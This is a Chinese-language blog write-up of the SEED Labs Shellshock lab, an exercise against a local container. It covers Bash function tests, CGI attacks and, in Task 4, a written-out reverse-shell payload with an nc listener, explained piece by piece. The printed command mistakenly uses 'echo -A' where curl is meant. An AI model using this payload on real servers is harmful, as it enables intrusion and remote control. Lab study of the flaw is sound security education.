---
title: Shellshock-Attack-Lab
categories:
  - SeedLabs/SoftwareSecurity
tags:
  - 
abbrlink: b0280669
date: 2022-11-13 00:42:50
---

## Environment Setup

###  DNS Setting

在 /etc/hosts 文件中写入如下，这是我们的需要攻击的服务器。有了这个就不用总是 ip 地址了，可以直接使用域名访问。

```
10.9.0.80 www.seedlab-shellshock.com
```

### Container Setup and Commands

```shell
docker-compose build # 构建环境
docker-compose up # 启动环境，开启后会停在一个地方，这个终端就用不了了，我们再开一个终端就行了

docker ps # 查看容器
docker exec -it <id> /bin/bash # 进入容器，<id> 可以只用输入前缀
ln -sf /bin/bash_shellshock /bin/sh # 将 sh 链接到有漏洞的 bash
```

### Web Server and CGI

在 `image_www` 文件夹中有一个 `CGI` 程序，叫做 `vul.cgi`，我们通过下面这个命令就能使其执行：

![image-20221112224029425](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221112224029425.png)

## Task 1: Experimenting with Bash Function

测试一下提供的 bash 有什么不同，就用书上介绍的那个漏洞就好了。

![image-20221112224643561](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221112224643561.png)

## Task 2: Passing Data to Bash via Environment Variable

都是书上的，知道怎么把数据添加到环境变量就可以了。

## Task 3: Launching the Shellshock Attack

3.A 和 3.B

![image-20221112232402286](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221112232402286.png)

3.C 和 3.D 想要用 && 同时执行两条命令，没有成功。

![image-20221112234605122](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221112234605122.png)

问题1:查看 `/etc/shadow` 肯定不行啊，因为 www-data 的 id 是 33，显然不是 root 用户。

问题2:感觉应该可以，但是我失败了，因为链接中存在空格服务器就解析不了。

## Task 4: Getting a Reverse Shell via Shellshock Attack

首先，开两个终端，第一个终端输入 `nc -nv -l 9090` 在本机的 9090 端口运行一个 TCP 服务器。

然后，另一个窗口执行如下命令，`echo -A "() { echo hello; }; echo Content_type: text/plain; echo; echo; /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1" http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi`。

- `10.9.0.1` 是本机的 ip，可以通过 ifconfig 命令查看。
- `/bin/bash -i` 中的 i 表示使用 shell 的可交互模式，shell 在这个模式会提供提示符。
- `> /dev/tcp/10.9.0.1/9090` 将输出重定向到特定的 TCP 连接。
- `0<&1` 将标准输出也用作标准输入，标准输出上面已经重定向了。
- `2>&1` 将标准错误也重定向到标准输出，也就是 TCP 连接。

输完这个命令。右边就得到 shell 了。现在我们在本地拿到了 shell，接下来可以继续攻击拿到 root 权限、

![image-20221113001751113](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221113001751113.png)

##  Task 5: Using the Patched Bash

显示是不行的，刚刚试了。